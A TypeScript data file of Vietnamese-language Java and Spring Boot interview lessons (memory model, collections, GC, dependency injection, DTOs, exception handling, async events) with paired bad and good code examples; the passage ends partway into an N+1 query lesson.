import React from 'react';

export interface LessonTopic {
  id: string;
  title: string;
  badge: string;
  summary: string;
  explanation: string;
  asciiDiagram?: string;
  badCodeTitle?: string;
  badCode?: string;
  goodCodeTitle?: string;
  goodCode?: string;
  interviewTip?: string;
}

export interface KnowledgeModule {
  id: string;
  title: string;
  icon: string;
  accentColor: string;
  tagline: string;
  topics: LessonTopic[];
}

export const KNOWLEDGE_MODULES: KnowledgeModule[] = [

  {
    id: 'core-java',
    title: 'Core Java & Tư Duy Bộ Nhớ',
    icon: '☕',
    accentColor: '#38bdf8',
    tagline: 'Hiểu cội nguồn JVM, quản lý bộ nhớ và cấu trúc dữ liệu để không bao giờ bị đè bug',
    topics: [
      {
        id: 'stack-vs-heap',
        title: '1. Stack vs Heap & Cơ Chế Truyền Tham Trị (Pass-by-Value)',
        badge: 'Cực Kỳ Quan Trọng',
        summary: 'Java lưu trữ biến cục bộ và con trỏ ở Stack, còn dữ liệu thực tế của đối tượng nằm ở Heap. Java LUÔN truyền tham trị (Pass-by-value).',
        explanation: `Trong JVM, bộ nhớ chia làm 2 khu vực chính mà bạn tiếp xúc hàng ngày:
1. **Stack Memory:** Mỗi Thread có một vùng Stack riêng. Dùng để lưu trữ các biến nguyên thủy cục bộ (int, double, boolean...) và các địa chỉ con trỏ (reference) trỏ tới object. Khi hàm chạy xong, Stack Frame bị hủy ngay lập tức, cực kỳ nhanh.
2. **Heap Memory:** Vùng nhớ dùng chung cho toàn bộ ứng dụng. Tất cả các object (kể cả mảng, String, List, hay Entity) đều được cấp phát trên Heap. Vùng này do bộ gom rác (Garbage Collector - GC) quản lý dọn dẹp.

⚠️ **Lầm tưởng kinh điển của sinh viên:** "Java truyền tham chiếu (Pass-by-reference)".
Sự thật: **Java LUÔN LUÔN truyền tham trị (Pass-by-Value)**! Khi bạn truyền một object vào hàm, Java copy **giá trị của địa chỉ con trỏ** chứ không truyền bản thân con trỏ gốc. Do đó:
- Bạn có thể sửa đổi thuộc tính bên trong object: \`user.setName("Nam")\` ➔ Có tác dụng ở ngoài hàm.
- Nhưng nếu bạn gán \`user = new User("Khác")\` ➔ KHÔNG CÓ tác dụng ngoài hàm vì bạn chỉ đang thay đổi bản sao con trỏ nội bộ!`,
        asciiDiagram: `[Thread Stack]                         [Shared Heap Memory]
┌─────────────────────────┐            ┌──────────────────────────────┐
│ Frame: main()           │            │                              │
│  int age = 22;          │            │  User Object:                │
│  User u ───────────────┼───────────>│  { id: 1, name: "Khuong" }    │
└─────────────────────────┘            │                              │
┌─────────────────────────┐            │                              │
│ Frame: modify(User u2)  │            │                              │
│  User u2 (copy ref) ────┼────────────┘                              │
└─────────────────────────┘            └──────────────────────────────┘`,
        badCodeTitle: '❌ Lầm tưởng hàm swap() đổi được 2 đối tượng',
        badCode: `// Sinh viên hay viết:
public void swap(User a, User b) {
    User temp = a;
    a = b;
    b = temp;
    // Ra ngoài hàm: a và b của caller KHÔNG HỀ THAY ĐỔI!
}`,
        goodCodeTitle: '✅ Hiểu đúng bản chất truyền bản sao con trỏ',
        goodCode: `public void updateUserName(User user, String newName) {
    // Sửa thuộc tính bên trong object thành công vì trỏ cùng ô nhớ Heap
    user.setName(newName);
    
    // Gán lại tham chiếu sẽ vô nghĩa với bên ngoài:
    // user = new User("Another"); // ❌ Không ảnh hưởng caller
}`,
        interviewTip: 'Nếu phỏng vấn viên hỏi: "Java là pass-by-value hay pass-by-reference?", hãy trả lời dứt khoát: "Java 100% là pass-by-value. Đối với kiểu tham chiếu (object), giá trị được truyền đi chính là bản sao của địa chỉ ô nhớ (copy of reference address)". Bạn sẽ ghi điểm tuyệt đối!'
      },
      {
        id: 'arraylist-vs-linkedlist',
        title: '2. ArrayList vs LinkedList: Tại Sao 99% Đi Làm Dùng ArrayList?',
        badge: 'Tối Ưu Hiệu Năng',
        summary: 'Ở trường hay dạy LinkedList chèn xóa nhanh O(1), nhưng đi làm 99% ta dùng ArrayList vì CPU Cache Locality.',
        explanation: `Ở trường đại học, thầy cô thường dạy lý thuyết trên giấy:
- \`ArrayList\`: Chèn/xóa ở giữa mảng tốn $O(N)$ vì phải dồn các phần tử còn lại.
- \`LinkedList\`: Chèn/xóa ở giữa tốn $O(1)$ vì chỉ cần đổi con trỏ \`prev\` và \`next\`.

**Thực tế đau lòng khi đi làm:**
1. Để chèn vào vị trí $i$ trong \`LinkedList\`, bạn phải duyệt từ đầu danh sách đến vị trí $i$ ➔ Bản thân việc tìm kiếm đã tốn **$O(N)$** rồi!
2. **CPU Cache Locality (Bộ nhớ đệm CPU):** \`ArrayList\` lưu trữ trên mảng liên tục (contiguous memory). Khi CPU đọc phần tử thứ $0$, phần cứng CPU tự động nạp luôn cả đoạn mảng lân cận vào L1/L2 Cache, giúp việc duyệt mảng nhanh gấp hàng chục lần.
3. \`LinkedList\` lưu trữ mỗi Node phân tán rải rác khắp nơi trên Heap. Duyệt \`LinkedList\` khiến CPU liên tục bị **Cache Miss** (phải chờ nạp từ RAM rất chậm), đồng thời tốn thêm 24 byte bộ nhớ chỉ để chứa 2 con trỏ \`prev\` và \`next\` cho mỗi Node.`,
        badCodeTitle: '❌ Thói quen dùng LinkedList vì nghĩ nó nhanh hơn',
        badCode: `// Nghĩ rằng chèn nhiều thì LinkedList sẽ tối ưu hơn:
List<Transaction> list = new LinkedList<>(); 
for (int i = 0; i < 100_000; i++) {
    list.add(new Transaction(i)); // Tốn cực nhiều RAM và chậm vì GC rác Node!
}`,
        goodCodeTitle: '✅ Luôn ưu tiên ArrayList và cấp phát trước kích thước nếu biết',
        goodCode: `// Khởi tạo ArrayList với initialCapacity ước lượng trước
List<Transaction> list = new ArrayList<>(100_000);
for (int i = 0; i < 100_000; i++) {
    list.add(new Transaction(i)); // Cực nhanh, tận dụng CPU cache liên tục
}`,
        interviewTip: 'Khi được hỏi so sánh ArrayList và LinkedList, hãy nhắc đến từ khóa "CPU Cache Locality" và "Memory Contiguity". Người phỏng vấn sẽ nhận ra bạn có tư duy phần cứng và kỹ sư thực thụ chứ không phải học vẹt lý thuyết trường lớp.'
      },
      {
        id: 'hashmap-internals',
        title: '3. Bản Chất HashMap & Hợp Đồng equals() / hashCode()',
        badge: 'Cực Kỳ Hay Hỏi',
        summary: 'Hiểu cơ chế mảng bucket, giải quyết xung đột bằng Cây Đỏ-Đen và tại sao quên override hashCode() sẽ làm mất dữ liệu.',
        explanation: `HashMap hoạt động dựa trên bảng băm (Hash Table):
1. **Tính vị trí Bucket:** Khi gọi \`map.put(key, value)\`, Java lấy mã băm của key bằng hàm \`key.hashCode()\`. Sau đó dùng phép tính bit: \`index = (n - 1) & hash\` để tìm vị trí bucket trong mảng.
2. **Xung đột băm (Hash Collision):** Nếu hai key khác nhau có cùng \`index\`, chúng sẽ rơi vào cùng một bucket.
   - Java 7: Nối các phần tử thành một Danh sách liên kết đơn (LinkedList). Khi xung đột nhiều, tìm kiếm bị chậm thành $O(N)$.
   - Java 8+: Nếu số phần tử trong 1 bucket $\ge 8$ và tổng dung lượng map $\ge 64$, bucket đó tự động chuyển hóa thành **Cây Đỏ-Đen (Red-Black Tree)**, giúp thời gian tìm kiếm giảm xuống chỉ còn **$O(\log N)$**!
3. **Hợp đồng equals() & hashCode():**
   - Nếu \`a.equals(b) == true\` thì bắt buộc \`a.hashCode() == b.hashCode()\`.
   - Nếu bạn chỉ override \`equals()\` mà quên override \`hashCode()\`: Hai object có cùng nội dung sẽ sinh ra hai mã hash khác nhau. Khi đưa vào Map, object thứ hai rơi vào bucket khác, dẫn đến việc gọi \`map.get(key)\` trả về \`null\` mặc dù key đã tồn tại!`,
        badCodeTitle: '❌ Override equals() nhưng quên hashCode()',
        badCode: `public class CustomerId {
    private String id;
    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (!(o instanceof CustomerId)) return false;
        return Objects.equals(id, ((CustomerId) o).id);
    }
    // ❌ QUÊN override hashCode(): HashMap.get() sẽ trả về NULL!
}`,
        goodCodeTitle: '✅ Luôn override cả hai (hoặc dùng Record trong Java 16+)',
        goodCode: `// Cách 1: Tự động sinh cả hai bằng IDE hoặc Objects.hash()
@Override
public int hashCode() {
    return Objects.hash(id);
}

// Cách 2: Dùng Java Record (tự động có equals/hashCode/toString chuẩn xác 100%)
public record CustomerId(String id) {}`,
        interviewTip: 'Luôn nhớ con số 8 và 64: Khi bucket có 8 node và map size >= 64, HashMap chuyển sang Cây Đỏ-Đen (Treeify). Khi số node giảm xuống 6, nó chuyển ngược lại LinkedList (Untreeify) để tiết kiệm bộ nhớ.'
      },
      {
        id: 'modern-java-features',
        title: '4. Java 8 Đến Java 21: Stream, Optional Đúng Cách & Records',
        badge: 'Cú Pháp Chuẩn Đi Làm',
        summary: 'Không lạm dụng Optional.get(), thay thế class DTO dài dòng bằng Record và viết code phong cách khai báo (Declarative).',
        explanation: `Đi làm hiện nay các công ty đều chạy từ Java 11, 17 đến 21. Những tính năng bạn bắt buộc phải thành thạo:
1. **Optional không phải để thay thế if(obj != null):**
   - ❌ Đừng viết: \`if (opt.isPresent()) { return opt.get(); }\` (viết thế này thì khác gì kiểm tra null thông thường?).
   - ✅ Dùng: \`opt.orElseThrow(() -> new NotFoundException())\` hoặc \`opt.map(...)\`.
   - Phân biệt: \`orElse(new Value())\` (luôn khởi tạo đối tượng dù có null hay không) vs \`orElseGet(() -> new Value())\` (chỉ khởi tạo khi thực sự null - Lazy evaluation).
2. **Records (Java 16+):** Loại bỏ hàng trăm dòng code Getter/Setter/Constructor thừa thãi của DTO. Record bất biến mặc định, an toàn đa luồng.
3. **Stream API:** Xử lý danh sách mang tính khai báo (filter, map, collect) thay cho các vòng lặp for lồng nhau phức tạp.`,
        badCodeTitle: '❌ Dùng Optional nghiệp dư và class DTO cồng kềnh',
        badCode: `// ❌ Biến Optional thành rác rối hơn cả check null:
Optional<User> userOpt = userRepo.findById(id);
if (userOpt.isPresent()) {
    User u = userOpt.get(); // Nếu quên check sẽ văng NoSuchElementException!
    return u.getName();
}
return "Default";`,
        goodCodeTitle: '✅ Dùng Optional chuẩn chỉnh & Record gọn gàng',
        goodCode: `// ✅ Khai báo DTO chỉ trong 1 dòng duy nhất:
public record UserSummaryDto(Long id, String name, String email) {}

// ✅ Xử lý Optional thanh thoát bằng Stream pipeline:
return userRepo.findById(id)
    .map(user -> new UserSummaryDto(user.getId(), user.getName(), user.getEmail()))
    .orElseThrow(() -> new UserNotFoundException(id));`,
        interviewTip: 'Hỏi về Optional: "Khi nào không nên dùng Optional?" ➔ Trả lời: Không dùng Optional làm tham số đầu vào của method, không dùng làm field trong Entity/Class và không bọc Collection vào Optional (hãy trả về List rỗng List.of() thay vì Optional<List>).'
      },
      {
        id: 'jvm-gc-generational',
        title: '5. Quản Lý Bộ Nhớ JVM & Cơ Chế Thu Gom Rác (GC): Young, Old & Metaspace',
        badge: 'Bản Chất Dưới Nắp Ca-pô',
        summary: 'Hiểu Weak Generational Hypothesis, vòng đời Object từ Eden -> Survivor -> Old Gen và cách tránh dính lỗi OutOfMemoryError kinh hoàng.',
        explanation: `Đi làm thực tế, việc ứng dụng bị sập vì **java.lang.OutOfMemoryError (OOM)** hoặc phản hồi chậm chạp do **Stop-The-World (STW)** là cơn ác mộng lớn nhất.
Để cấu hình RAM cho container Docker/Kubernetes và đọc GC log chuẩn chỉ, bạn phải nắm vững cấu trúc bộ nhớ JVM:

1. **Weak Generational Hypothesis (Giả thuyết thế hệ yếu):**
   - 95% các object trong Java có tuổi thọ cực ngắn (sống trong một hàm rồi chết ngay sau khi tính toán xong).
   - Do đó, JVM chia Heap thành 2 thế hệ riêng biệt: **Young Generation** và **Old Generation (Tenured)** để áp dụng thuật toán gom rác tối ưu nhất.

2. **Vòng đời của một đối tượng trên Heap:**
   - **Eden Space:** Nơi mọi object mới sinh ra (\`new\`).
   - Khi Eden đầy ➔ **Minor GC** kích hoạt. Các object còn sống được copy sang Survivor Space 0 (S0) với tuổi (age) = 1.
   - Minor GC tiếp theo: Object sống từ Eden và S0 được dọn sang S1. Hai vùng S0 và S1 hoán đổi luân phiên nhau (FromSpace và ToSpace).
   - Khi tuổi thọ object vượt ngưỡng **MaxTenuringThreshold** (mặc định là 15 lần GC sống sót) ➔ Đối tượng được thăng hạng (Promotion) sang **Old Generation**.
   - Khi Old Gen đầy ➔ **Major GC / Full GC** kích hoạt (STW kéo dài làm đơ ứng dụng).

3. **Metaspace (Native Memory):**
   - Từ Java 8, Metaspace thay thế PermGen, lưu trữ Metadata của Class, Method và hằng số byte-code. Metaspace dùng bộ nhớ RAM thực của hệ điều hành, không nằm trong Java Heap.

4. **3 Nguyên nhân gây rò rỉ bộ nhớ (Memory Leak) phổ biến nhất:**
   - Dùng \`static Collection\` (Map, List) để cache dữ liệu mà không có cơ chế giới hạn kích thước (Eviction / TTL).
   - Quên đóng tài nguyên: Connection, Stream, Socket không dùng \`try-with-resources\`.
   - \`ThreadLocal\` không gọi \`.remove()\` trong môi trường Thread Pool (Tomcat), khiến dữ liệu người dùng cũ bị giữ vĩnh viễn trong RAM.`,
        asciiDiagram: `┌─────────────────────────────────────────────── Java Heap Memory ──────────────────────────────────────────────┐
│                                                                                                               │
│   ┌────────────────────────── Young Generation ──────────────────────────┐   ┌───────── Old Generation ────────┐   │
│   │                                                                      │   │        (Tenured Space)          │   │
│   │   ┌────────────── Eden ──────────────┐  ┌──── S0 ────┐ ┌──── S1 ────┐│   │                                 │   │
│   │   │  Object mới sinh ra (new User)   │  │ Survivor 0 │ │ Survivor 1 ││ ─>│  Object sống lâu (age > 15)     │   │
│   │   │  Minor GC dọn dẹp liên tục       │  │ (FromSpace)│ │  (ToSpace) ││   │  Spring Singletons, Long Cache  │   │
│   │   └──────────────────────────────────┘  └────────────┘ └────────────┘│   │  Full GC dọn dẹp (STW nguy hiểm)│   │
│   └──────────────────────────────────────────────────────────────────────┘   └─────────────────────────────────┘   │
└───────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
  [Metaspace (OS Native RAM)]: Chứa Class Metadata, Method Bytecode, Reflection, Spring CGLIB Proxies`,
        badCodeTitle: '❌ Tạo Memory Leak bằng static collection và ThreadLocal bẩn',
        badCode: `public class MemoryLeakHazards {
    // ❌ RÒ RỈ 1: Static Map lưu không giới hạn -> Sập OOM Heap sau vài ngày chạy!
    private static final Map<String, UserSession> SESSIONS = new HashMap<>();

    // ❌ RÒ RỈ 2: ThreadLocal không remove trong Thread Pool
    private static final ThreadLocal<UserContext> CONTEXT = new ThreadLocal<>();

    public void handleRequest(UserContext ctx) {
        CONTEXT.set(ctx);
        // Quên gọi CONTEXT.remove() trong finally!
        // Tomcat tái sử dụng thread này cho request khác -> lộ data và rò rỉ RAM!
    }
}`,
        goodCodeTitle: '✅ Dùng Cache chuyên dụng có TTL và dọn ThreadLocal chuẩn chỉ',
        goodCode: `public class SafeMemoryPractices {
    // ✅ Sử dụng Caffeine Cache: Tự động xóa bớt khi đầy hoặc hết hạn TTL:
    private final Cache<String, UserSession> sessionCache = Caffeine.newBuilder()
            .maximumSize(10_000)
            .expireAfterWrite(Duration.ofMinutes(30))
            .build();

    // ✅ Luôn giải phóng ThreadLocal trong khối finally:
    public void executeWithContext(UserContext ctx, Runnable task) {
        try {
            UserContextHolder.set(ctx);
            task.run();
        } finally {
            UserContextHolder.clear(); // Bắt buộc gọi ThreadLocal.remove()!
        }
    }
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Làm thế nào để điều tra lỗi OutOfMemoryError trên Production?", hãy trả lời: "1. Bật flag JVM: -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/dumps để tự động chụp Heap Dump khi sập. 2. Dùng công cụ Eclipse Memory Analyzer (MAT) hoặc VisualVM mở file .hprof, kiểm tra Dominator Tree để tìm xem Class nào đang chiếm 80-90% RAM và xem đường dẫn tham chiếu (Incoming References) để fix tận gốc".'
      }
    ]
  },
  {
    id: 'spring-boot',
    title: 'Spring Boot & Kiến Trúc REST API',
    icon: '🚀',
    accentColor: '#fbbf24',
    tagline: 'Làm chủ Inversion of Control, thiết kế API chuẩn mực và không bao giờ để rò rỉ dữ liệu',
    topics: [
      {
        id: 'constructor-injection',
        title: '1. Tại Sao CẤM Dùng @Autowired Trên Field (Field Injection)?',
        badge: 'Quy Tắc Sống Còn',
        summary: 'Field Injection là nguyên nhân gây khó viết Unit Test, mất tính bất biến (Immutability) và dễ gây lỗi vòng lặp phụ thuộc ngầm.',
        explanation: `Trong các bài hướng dẫn cũ hoặc đồ án sinh viên, bạn thường thấy:
\`\`\`java
@Autowired
private OrderRepository orderRepository;
\`\`\`
Khi đi làm ở các công ty chuyên nghiệp, **Pull Request có dòng code này sẽ bị Senior từ chối merge ngay lập tức!**

**3 Lý do Field Injection bị coi là "Code Mùi" (Code Smell):**
1. **Không thể viết Unit Test thuần túy:** Biến bị đánh dấu \`private\`. Khi viết Unit Test, bạn không thể \`new OrderService()\` rồi truyền repo giả vào được mà bắt buộc phải khởi động cả Spring Context chậm chạp hoặc dùng Reflection bẩn.
2. **Không thể dùng từ khóa \`final\`:** Không có \`final\`, object không thể đảm bảo tính bất biến (Immutability), tiềm ẩn nguy cơ bị ghi đè sau khi khởi tạo.
3. **Che giấu vi phạm Single Responsibility:** Field injection nhìn rất ngắn gọn nên lập trình viên dễ dàng tiêm 10-15 dependencies vào 1 class mà không thấy "ngại". Với Constructor Injection, khi constructor có 8 tham số, bạn sẽ nhận ra class này đang quá tải và cần tách nhỏ.`,
        badCodeTitle: '❌ Field Injection thiếu an toàn',
        badCode: `@Service
public class OrderService {
    @Autowired
    private OrderRepository orderRepository;
    @Autowired
    private PaymentService paymentService;
    // Rất khó viết Unit Test, không thể dùng 'final'!
}`,
        goodCodeTitle: '✅ Constructor Injection kết hợp Lombok @RequiredArgsConstructor',
        goodCode: `@Service
@RequiredArgsConstructor // Lombok tự tạo constructor cho tất cả trường 'final'
public class OrderService {
    private final OrderRepository orderRepository;
    private final PaymentService paymentService;

    // Viết Unit test siêu nhanh và nhẹ nhàng:
    // OrderService service = new OrderService(mockRepo, mockPayment);
}`,
        interviewTip: 'Nếu phỏng vấn viên hỏi: "Làm sao phát hiện lỗi Circular Dependency (A cần B, B cần A) sớm nhất?", hãy trả lời: "Khi dùng Constructor Injection, Spring sẽ ném lỗi BeanCurrentlyInCreationException ngay lúc ứng dụng khởi động (Fail-Fast), trong khi Field Injection có thể giấu lỗi đến tận khi phương thức được gọi lần đầu".'
      },
      {
        id: 'layered-architecture-dto',
        title: '2. Kiến Trúc 3 Tầng Chuẩn & Quy Tắc CẤM Lộ Entity Ra Controller',
        badge: 'Thiết Kế Hệ Thống',
        summary: 'Tách biệt ranh giới Controller - Service - Repository. Luôn dùng Request/Response DTO để bảo vệ cơ sở dữ liệu.',
        explanation: `Một ứng dụng Backend chuyên nghiệp luôn chia thành 4 lớp rõ ràng:
1. **Controller:** Cửa ngõ đón nhận HTTP Request. Chỉ làm nhiệm vụ: parse JSON, kiểm tra tính hợp lệ dữ liệu (@Valid), gọi Service và trả HTTP Response.
2. **Service:** Trái tim hệ thống. Chứa toàn bộ nghiệp vụ, logic tính toán, gọi nhiều Repository, quản lý Transaction (@Transactional).
3. **Repository:** Tầng giao tiếp cơ sở dữ liệu (Spring Data JPA).
4. **DTO (Data Transfer Object):** Đối tượng chuyên chở dữ liệu giữa Client và Server.

🚨 **Tội lỗi lớn nhất của Fresher:** Trả trực tiếp Hibernate Entity ra Controller!
- **Hậu quả 1 (Lộ dữ liệu nhạy cảm):** Entity User chứa cả cột \`password_hash\`, \`role\`, \`token\`. Khi serialize ra JSON, toàn bộ thông tin nhạy cảm này bị gửi về cho phía người dùng!
- **Hậu quả 2 (Lỗi LazyInitializationException):** Khi Jackson cố gắng serialize các quan hệ \`@OneToMany(fetch = LAZY)\`, Hibernate Session đã đóng từ tầng Service, làm nổ lỗi 500 hàng loạt.
- **Hậu quả 3 (Vòng lặp vô tận StackOverflow):** Nếu quan hệ 2 chiều (User có List<Order>, Order có User), Jackson sẽ tuần tự hóa xoay vòng A -> B -> A -> B... cho đến khi server sập vì tràn Stack!`,
        badCodeTitle: '❌ Trả Entity trực tiếp ra ngoài Controller',
        badCode: `@GetMapping("/orders/{id}")
public Order getOrder(@PathVariable Long id) {
    // Nguy hiểm: Lộ schema DB, dễ bị nổ LazyInitializationException!
    return orderRepository.findById(id).orElse(null);
}`,
        goodCodeTitle: '✅ Dùng DTO Response và ResponseEntity chuẩn REST',
        goodCode: `@GetMapping("/orders/{id}")
public ResponseEntity<OrderResponseDto> getOrder(@PathVariable Long id) {
    OrderResponseDto dto = orderService.getOrderById(id);
    return ResponseEntity.ok(dto);
}

// DTO chỉ chứa đúng những trường client cần xem:
public record OrderResponseDto(
    Long orderId,
    BigDecimal totalAmount,
    String status,
    List<OrderItemDto> items
) {}`,
        interviewTip: 'Khi giải thích về DTO, hãy nhấn mạnh: "DTO đóng vai trò như một lớp tường lửa phân tách API Contract (hợp đồng với client) và Database Schema (lược đồ bảng nội bộ). Khi database đổi tên cột, API client bên ngoài không hề bị ảnh hưởng".'
      },
      {
        id: 'global-exception-handling',
        title: '3. Xử Lý Lỗi Toàn Cục Bằng @RestControllerAdvice (RFC 7807)',
        badge: 'Clean Code',
        summary: 'Dẹp bỏ try-catch rải rác ở Controller. Đóng gói lỗi chuyên nghiệp trả về đúng HTTP Status code.',
        explanation: `Đừng bao giờ viết \`try-catch\` trong từng phương thức của Controller. Hãy để Exception văng ra tự nhiên và để một lớp bắt lỗi toàn cục (\`@RestControllerAdvice\`) chịu trách nhiệm đóng gói.

**Chuẩn hóa thông báo lỗi:**
- Lỗi tìm không thấy tài nguyên ➔ Trả về **404 NOT FOUND**.
- Lỗi validate dữ liệu người dùng gửi sai ➔ Trả về **400 BAD REQUEST**.
- Lỗi chưa đăng nhập ➔ Trả về **401 UNAUTHORIZED**.
- Lỗi đã đăng nhập nhưng không có quyền ➔ Trả về **403 FORBIDDEN**.
- Lỗi xung đột dữ liệu (trùng email, duplicate key) ➔ Trả về **409 CONFLICT**.
- Lỗi crash không lường trước ➔ Trả về **500 INTERNAL SERVER ERROR** kèm mã Correlation ID để tra cứu log.`,
        badCodeTitle: '❌ Try-catch thủ công và trả về mã lỗi lung tung',
        badCode: `@PostMapping("/users")
public ResponseEntity<?> createUser(@RequestBody UserDto dto) {
    try {
        userService.save(dto);
        return ResponseEntity.ok("Success");
    } catch (Exception e) {
        // Trả HTTP 200 kèm chuỗi thông báo lỗi ➔ Frontend tưởng thành công!
        return ResponseEntity.ok("Lỗi: " + e.getMessage());
    }
}`,
        goodCodeTitle: '✅ @RestControllerAdvice bắt lỗi tập trung',
        goodCode: `@RestControllerAdvice
@Slf4j
public class GlobalExceptionHandler {

    @ExceptionHandler(ResourceNotFoundException.class)
    public ProblemDetail handleNotFound(ResourceNotFoundException ex) {
        log.warn("Không tìm thấy tài nguyên: {}", ex.getMessage());
        ProblemDetail problem = ProblemDetail.forStatusAndDetail(HttpStatus.NOT_FOUND, ex.getMessage());
        problem.setTitle("Resource Not Found");
        problem.setProperty("timestamp", Instant.now());
        return problem;
    }

    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ProblemDetail handleValidation(MethodArgumentNotValidException ex) {
        Map<String, String> errors = new HashMap<>();
        ex.getBindingResult().getFieldErrors().forEach(f -> errors.put(f.getField(), f.getDefaultMessage()));
        ProblemDetail problem = ProblemDetail.forStatus(HttpStatus.BAD_REQUEST);
        problem.setTitle("Validation Failed");
        problem.setProperty("errors", errors);
        return problem;
    }
}`,
        interviewTip: 'Nhắc đến RFC 7807 (ProblemDetail) trong Spring Boot 3 là một "điểm cộng vàng". Nó chứng minh bạn luôn cập nhật các tiêu chuẩn API hiện đại nhất của ngành.'
      },
      {
        id: 'spring-async-event-driven',
        title: '4. Bất Đồng Bộ Chuẩn Mực: ThreadPoolTaskExecutor & @TransactionalEventListener',
        badge: 'Kiến Trúc Hiệu Năng Cao',
        summary: 'Tuyệt đối cấm dùng @Async với thread pool mặc định SimpleAsyncTaskExecutor. Tách biệt logic gửi mail, notification bằng Event-Driven.',
        explanation: `Khi xây dựng các tính năng như gửi email chào mừng, thông báo đẩy (push notification) hoặc tích hợp bên thứ ba sau khi tạo tài khoản:
Nếu bạn gọi tuần tự trong luồng HTTP chính, người dùng phải chờ 3-5 giây mới nhận được response!

**1. Hiểm họa ngầm khi dùng @Async thiếu cấu hình Thread Pool:**
- Nếu bạn chỉ thêm \`@EnableAsync\` và \`@Async\`, Spring Boot sẽ dùng **SimpleAsyncTaskExecutor**.
- Executor mặc định này **KHÔNG CÓ POOL**! Mỗi lần hàm được gọi, nó lại \`new Thread()\` mới từ hệ điều hành. Khi có 1,000 request ập đến, hệ điều hành cạn kiệt Thread (OS thread exhaustion), gây sập toàn bộ JVM!
- **Bắt buộc:** Khởi tạo một Bean \`ThreadPoolTaskExecutor\` với các thông số: \`corePoolSize\`, \`maxPoolSize\`, \`queueCapacity\` và \`CallerRunsPolicy\`.

**2. Event-Driven Decoupling với ApplicationEventPublisher:**
- Tách tầng Service tạo tài khoản không cần biết đến NotificationService hay LoyaltyPointService.
- Chỉ cần bắn ra 1 Domain Event: \`eventPublisher.publishEvent(new UserRegisteredEvent(user));\`.

**3. Cạm bẫy Transactional:**
- Nếu dùng \`@EventListener\` thông thường, event chạy ngay khi hàm phát ra, **KHI MÀ DATABASE CHƯA COMMIT TRANSACTION**!
- Nếu sau đó DB bị rollback (ví dụ trùng username), khách hàng vẫn nhận được email "Đăng ký thành công" trong khi tài khoản không hề tồn tại trong DB!
- **Giải pháp:** Bắt buộc dùng \`@TransactionalEventListener(phase = TransactionPhase.AFTER_COMMIT)\`!`,
        asciiDiagram: `[HTTP Request] ──> [UserService.register()]
                           │
                           ├── 1. Ghi Database (Transaction Đang Mở)
                           │
                           ├── 2. eventPublisher.publishEvent(UserRegisteredEvent)
                           │         │
                           │         ▼ (Chờ DB commit thành công)
                           └── 3. COMMIT TRANSACTION DATABASE ✅
                                     │
                                     ▼ (Kích hoạt AFTER_COMMIT)
                     [@TransactionalEventListener + @Async]
                                     │
                    [Custom ThreadPool: email-worker-1]
                                     │
                     Gửi Email / Call SMS Gateway / Push Notification`,
        badCodeTitle: '❌ Gọi @Async mặc định & bắn event trước khi commit',
        badCode: `@Service
public class UserService {
    @Autowired private JavaMailSender mailSender;

    @Transactional
    public void register(UserDto dto) {
        userRepo.save(dto.toEntity());
        // ❌ LỖI: Gửi mail đồng bộ chặn luồng HTTP 3 giây, 
        // hoặc nếu DB lỗi rollback ở dưới thì mail đã lỡ gửi đi mất rồi!
        sendWelcomeEmail(dto.email());
        validateKyc(dto); // Nếu dòng này ném Exception -> DB rollback nhưng mail đã gửi!
    }

    @Async // ❌ Không chỉ định Bean name -> Dùng SimpleAsyncTaskExecutor tạo thread vô tội vạ!
    public void sendWelcomeEmail(String email) { ... }
}`,
        goodCodeTitle: '✅ ThreadPoolTaskExecutor chuẩn & @TransactionalEventListener',
        goodCode: `@Configuration
@EnableAsync
public class AsyncConfig {
    @Bean("taskExecutor")
    public Executor taskExecutor() {
        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();
        executor.setCorePoolSize(10);
        executor.setMaxPoolSize(50);
        executor.setQueueCapacity(200);
        executor.setThreadNamePrefix("async-worker-");
        // Khi hàng đợi 200 task bị đầy, luồng gọi (Tomcat thread) sẽ tự chạy task để tự hãm tốc độ (Backpressure):
        executor.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy());
        executor.initialize();
        return executor;
    }
}

@Component
public class UserNotificationListener {
    // ✅ Chỉ chạy sau khi Transaction đã commit 100% thành công vào DB:
    @Async("taskExecutor")
    @TransactionalEventListener(phase = TransactionPhase.AFTER_COMMIT)
    public void onUserRegistered(UserRegisteredEvent event) {
        // Gửi email hoặc bắn Kafka an toàn tuyệt đối
        emailService.sendWelcome(event.email());
    }
}`,
        interviewTip: 'Khi phỏng vấn về kiến trúc Microservices / High Concurrency, hãy giải thích: "Để tránh Distributed Monolith và Coupling, em luôn dùng Domain Events với @TransactionalEventListener(phase = AFTER_COMMIT). Nó đảm bảo tính nhất quán cuối cùng (Eventual Consistency) mà không làm rò rỉ dữ liệu khi transaction rollback".'
      }
    ]
  },
  {
    id: 'jpa-database',
    title: 'JPA, Hibernate & Bệnh N+1 Query',
    icon: '💾',
    accentColor: '#f97316',
    tagline: 'Đặc trị lỗi hiệu năng phổ biến nhất làm sập cơ sở dữ liệu trong các dự án thực tế',
    topics: [
      {
        id: 'n-plus-one-deep-dive',
        title: '1. N+1 Query Problem: Bản Chất & 2 Phương Pháp Đặc Trị',
        badge: '90% Ứng Viên Bị Hỏi',
        summary: 'N+1 là thảm họa khi load 1 danh sách cha rồi chạy thêm N câu query con. Khắc phục bằng JOIN FETCH hoặc @EntityGraph.',
        explanation: `Giả sử bảng \`Department\` (Khoa) có quan hệ \`@OneToMany\` với \`Employee\` (Nhân viên).
Bạn muốn lấy danh sách 100 Khoa và in ra tên các Nhân viên trong từng Khoa.

**Diễn biến của thảm họa N+1:**
1. Hibernate chạy **1 câu query đầu tiên**: \`SELECT * FROM department\` (Lấy được 100 bản ghi).
2. Khi bạn duyệt vòng lặp \`for (Department d : departments)\` và gọi \`d.getEmployees()\`:
   Vì quan hệ là LAZY, Hibernate lập tức gửi thêm **1 câu query riêng biệt cho từng Khoa**:
   \`SELECT * FROM employee WHERE department_id = 1\`
   \`SELECT * FROM employee WHERE department_id = 2\`
   ...
   \`SELECT * FROM employee WHERE department_id = 100\`
3. **Tổng cộng:** $1 + 100 = 101$ câu truy vấn gửi xuống cơ sở dữ liệu trong vòng vài phần trăm giây!
